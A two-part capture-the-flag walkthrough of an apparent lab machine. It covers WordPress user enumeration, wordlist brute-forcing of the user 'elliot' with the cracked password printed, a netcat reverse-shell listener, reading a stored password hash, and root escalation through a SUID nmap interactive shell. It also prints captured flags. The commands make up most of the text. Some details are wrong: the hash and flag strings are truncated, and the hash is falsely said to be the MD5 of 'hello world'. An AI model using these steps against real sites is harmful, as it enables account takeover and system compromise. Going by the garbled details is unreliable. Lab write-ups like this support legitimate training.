PART 1 
Project Goal:
To assess the security of the WordPress site at http://10.10.89.207, gather information about its version, users, and attempt to brute-force a password using a wordlist.

Work Process and Used Code

Running WPScan to gather basic information
wpscan --url http://10.10.89.207 --enumerate u --disable-tls-checks
Result:

WordPress version 4.3.1 found

XML-RPC enabled

Theme: twentyfifteen

No users found

Finding username by author ID enumeration
Since WPScan did not reveal any users, I manually enumerated author IDs:

for i in {1..10}; do
  curl -s -L "http://10.10.89.207/?author=$i" | grep -oP '(?<=/author/)[^/"]+'
done
Result:
Found username — elliot

Downloading the dictionary file from the server
Found a dictionary file fsocity.dic on the server and downloaded it:

curl http://10.10.89.207/fsocity.dic -o fsocity.dic
Cleaning the dictionary from duplicates
Sorted and removed duplicates in the dictionary:

sort -u fsocity.dic -o fsocity_clean.dic
Brute-forcing the password for user elliot via WPScan
Used this command to brute-force the password with the wordlist:

wpscan --url http://10.10.89.207 \
  --usernames elliot \
  --passwords fsocity_clean.dic \
  --disable-tls-checks
Final Result:
Successfully cracked the password:

Username: elliot
Password: ER28-0652

Conclusion:
The site is running an outdated WordPress version vulnerable to XML-RPC attacks.

The username elliot was discovered by enumerating author IDs.

Using the dictionary fsocity.dic found on the server helped quickly brute-force the password.

The gathered data allows unauthorized access to the site.

PART2 
Objective: Obtain all three flags, with the final one requiring root privilege escalation.

Initial Setup
Target IP: 10.10.218.92

Your IP (attacker): 10.10.120.96

Step 1. Establishing a Reverse Shell
On your machine (10.10.120.96), you started a Netcat listener:

nc -lnvp 4444
On the target machine (10.10.218.92), you triggered a reverse shell connecting back to your listener.

After the connection was established, you got a shell as the user daemon.

Step 2. Information Gathering and Switching to User robot
Checked the current user:

whoami
daemon
Explored home directories and found files under /home/robot:


cd /home/robot
ls -lsa
cat password.raw-md5
The file password.raw-md5 contained an MD5 hash of the robot user’s password:

robot:c3fcd3d76192e4007dfb496cca67e13
Recognized the hash as the MD5 of "hello world".

Switched to the user robot using the password "hello world":

su robot
Successfully switched to robot.

Step 3. Obtaining the Second Flag
Navigated to robot's home directory and read the second flag:

cd /home/robot
cat key-2-of-3.txt
Second flag obtained:

822c73956184f694993bede3eb39f95
Step 4. Privilege Escalation Attempt
Checked sudo permissions for robot:

sudo -l
Could not use sudo as the password was unknown.

Searched for root-owned SUID binaries:

find / -perm -4000 -user root -type f 2>/dev/null
Found /usr/local/bin/nmap with SUID bit set.

Launched nmap in interactive mode and executed a shell command:

/usr/local/bin/nmap --interactive
nmap> !sh
Got a root shell.

Step 5. Obtaining the Third Flag (Root Level)
Changed directory to root’s home and read the third flag:

cd /root
cat key-3-of-3.txt
Third flag obtained:


04787ddef27c3dee1ee161b21670b4e
Summary
Used reverse shell to get initial access as daemon.

Cracked MD5 hash to find robot’s password and switched to user robot.

Retrieved the second flag from robot’s home directory.

Found and exploited SUID nmap binary to escalate privileges to root.

Retrieved the third flag from root’s home directory.
